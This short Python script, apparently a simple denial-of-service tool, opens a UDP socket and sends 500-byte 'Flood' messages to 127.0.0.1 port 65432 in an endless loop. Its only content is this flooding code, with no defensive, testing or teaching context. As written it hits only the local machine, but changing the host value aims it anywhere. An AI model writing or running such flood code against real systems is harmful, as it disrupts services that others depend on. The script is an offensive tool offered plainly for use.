import socket

HOST = '127.0.0.1'
PORT = 65432

def start_flood():
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        while True:
            message = "Flood" * 100  # Construct a large message
            s.sendto(message.encode(), (HOST, PORT))
            print("Packet sent")

if __name__ == "__main__":
    start_flood()
